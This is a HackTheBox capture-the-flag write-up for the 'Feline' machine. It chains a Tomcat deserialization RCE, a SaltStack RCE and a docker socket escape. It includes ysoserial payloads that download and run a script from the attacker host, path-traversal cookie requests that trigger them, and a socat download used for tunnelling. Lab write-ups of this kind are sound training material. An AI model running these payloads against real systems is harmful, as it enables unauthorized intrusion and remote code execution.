---
title: "Feline"
subtitle: "HackTheBox"
author: GoProSlowYo
date: "2021-08-31"
subject: "Feline Write-Up"
keywords: \[HTB, HackTheBox, InfoSec\]
lang: "en"
titlepage: true
titlepage-text-color: "FFFFFF"
titlepage-color: "0c0d0e"
titlepage-rule-color: "8ac53e"
titlepage-rule-height: 0
logo: "./resources/9059f2197d78496b88ea51e535375dd3.png"
logo-width: 6in
toc: true
toc-own-page: true
---

# Feline

## Overview

This was a really hard box that starts off with a Java deserialization RCE and then takes it up a notch with a Saltstack RCE to privesc into a docker container. From there you need to escape the docker container to get a root shell using some manipulation of the docker socket which was helpfully mounted inside the saltstack container.

## Enumeration

We started off with the typical Rustscan/nmap of the open ports:

```shell
# Nmap 7.80 scan initiated Tue Aug 31 18:09:52 2021 as: nmap -vvv -p 22,8080 -sS -sV -sC -oN 10.10.10.205.feline.nmap.txt 10.10.10.205
Nmap scan report for 10.10.10.205
Host is up, received echo-reply ttl 63 (0.081s latency).
Scanned at 2021-08-31 18:09:52 PDT for 10s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 9.0.27
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 31 18:10:02 2021 -- 1 IP address (1 host up) scanned in 10.27 seconds
```
**Rustscan/nmap Output**

Looks like there's an `Apache Tomcat` webserver on `8080`. In typical HackTheBox fashion we should add the name of the box to our `/etc/hosts` file and then we check out the website.

![20210905_145105.png](./resources/4657dcace27847af81d5772525fbc440.png)
**VirusBucket Website on 8080 served via Apache Tomcat**

There's not much to go on with the current page so let's enumerate further with `Feroxbuster`.

![2021-09-06_06-27-24.png](./resources/a98d8ce637fa49678d9678d81fc4362c.png)
**Feroxbuster Output**

### Port 8080 - Apache Tomcat

`Feroxbuster` immediately found `/images` and `/services`, the latter of which is interesting to us:

![1078adcfccd9128c9c35e97dd227b1f7.png](./resources/4060d3d5c5e440cfb4aa930ea831f8b3.png)
**VirusBucket Upload Service**

Looks like we can upload files and they'll end up on the machine. We just don't know where yet. We had a version of Tomcat given to use earlier so we should see if there were any RCEs or other CVEs that might help us here.

Initially we only found some exploit-db results which were not exactly what we were looking for so this taught us to google a little further in some cases outside of exploit-db:

![20210905_151718.png](./resources/d5a92efca2df45eaa70eb780e555f854.png)
**Googling a Little Deeper**

We find a great blog post on [RedTimmy](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/) that helpfully outlines an exploit for the version of Tomcat that's running here and gives us some PoC examples to walk through.

![2021-09-05_15-12-57.png](./resources/6f0b6abc68bb4371a7d456e61cac1395.png)
**RedTimmy Apache Tomcat Deserialization Blog Post**

## Foothold and Exploitation

Following the PoC in the blog post we can use `ysoserial` to create a malicious java payload that contains a deserailization payload that will run our commands.
```shell
$ java -jar ysoserial.jar CommonsCollections2 'curl http://10.10.14.16:32001/p.sh -o /tmp/p.sh' > curl.session
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

$ java -jar ysoserial.jar CommonsCollections2 'chmod +x /tmp/p.sh' > chmod.session
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

$ java -jar ysoserial.jar CommonsCollections2 '/tmp/p.sh' > exec.session
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

![2021-09-05_15-24-39.png](./resources/7f2de8e6f9df4159be2b6bc65f35e69a.png)
**Creating Malicious Paylods with ysoserial**

The only thing we need to know now is where our uploads end up on the server. We found by using Zap and messing around with the filename we send to the webserver that if we do not include a filename it causes and error and helpfully reveals the upload location:

![2021-09-06_05-58-11.png](./resources/421737e1eb2149ae835c99516bad7822.png)
**Fuzzing with Zap on the Filename**

![2021-09-06_05-58-54.png](./resources/4063befe126245f1ab3bb6fdb1a16b37.png)
**Path Disclosure via an Error Message**

Now we're ready to use `curl` with a specially crafted `Cookie` header to achieve RCE.

```shell
curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../opt/samples/uploads/curl" >/dev/null
curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../opt/samples/uploads/chmod" >/dev/null
curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../opt/samples/uploads/exec" >/dev/null
```

After that series of curl commands we should have received a reverse shell:

![2021-09-06_02-11-15.png](./resources/9f82a349a2a64ee59450691906f73d77.png)
**Getting an Initial Foothold via a Deserialization Attack**

## Further Enumeration and Privilege Escalation

I poked around the box a little bit but was unable to turn up anything interested with a quick look at SETUID binaries, cronjobs, `/var/backup` and for easy wins in the directories in `/home/`. So next I tried linpeas and noticed some interesting internal services this time.

![2021-09-06_02-24-37.png](./resources/bfa0bb18bbc6492ab53b69e96dd69336.png)
**Some Service Listening Internally**

Some of the other ports like 8000 and 8005 seemed arbitrary right now and I wasn't sure of what services run on ports `4505` and `4506` so we asked Google:

![2021-09-06_02-26-12.png](./resources/661379f2acc14b48b04ac07bc3f08eba.png)
**Google, what's port 4505?**

SaltStack! Let's find out what the RCE or privesc is :). We googled around a bit and stumbled upon `CVE-2020-11651` and [this GitHub repository](https://github.com/jasperla/CVE-2020-11651-poc) with an extremely helpful PoC.

Unfortunately the service we want to exploit is not listening externally and we needed to use a few python dependencies, notably the `salt` python module. To get around this we can use `socat` to proxy TCP traffic sent to a port listening externally on the victim to a specific socket.

```shell
tomcat@VirusBucket:/var/crash$ curl -LO http://10.10.14.4:32001/socat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  366k  100  366k    0     0   574k      0 --:--:-- --:--:-- --:--:--  575k
tomcat@VirusBucket:/var/crash$ chmod +x socat                                   
tomcat@VirusBucket:/var/crash$ ./socat tcp-l:45060,fork,reuseaddr tcp:127.0.0.1:4506 &
[1] 86671
```

![2021-09-06_03-31-39.png](./resources/03d8570dd9cb491d8bb1673639fba09b.png)
**Socat to the rescue^H^H^H^Hlay**

Once we have our socat proxy ready and our netcat listener up we can use the PoC code to get a shell inside a Saltstack master docker container.

![2021-09-06_03-28-50.png](./resources/e6358de9f1d94591a80bd75673f17b67.png)
**Getting a shell via Saltstack RCE**

The command that we ran was sensitive to the order of the "quotes" and if we look at the error logs in the Salt container we can see why the shell with inner single quotes did not work. We were breaking the `subprocess.Popen()` arguments with the single quotes:

![2021-09-06_04-17-16.png](./resources/7c93bc76acff43f885dea04971409e89.png)
**Why Quoting in our Payload Matters!**

## Inception ... or Privilege Escalation from Docker 

Now we need to escape from the container into the host. We enumerated the container and found the docker socket at first but weren't sure how to abuse it without having the `docker` command.

We found two REALLY HELPFUL resources about abusing the docker socket via `curl` and `socat` one from [Dejan Zelic](https://dejandayoff.com/the-danger-of-exposing-docker.sock/) and the other from [SecureIdeas](https://secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html) here.

Using the information here we were able to find out that there is an image on the docker host called `sandbox`. We're going to launch that container, mount the host file system into it.

![2021-09-06_05-30-48.png](./resources/d08e2075da554bccbed311efcbfd1a54.png)
**Staging, Creating, and Starting our Docker Container**

Next we need to attach to the new container to get our root flag.

![2021-09-06_06-05-45.png](./resources/5bdb30710cd64ff0a8d2a71c2ba0c020.png)
**Give me the flag already, damnit!**
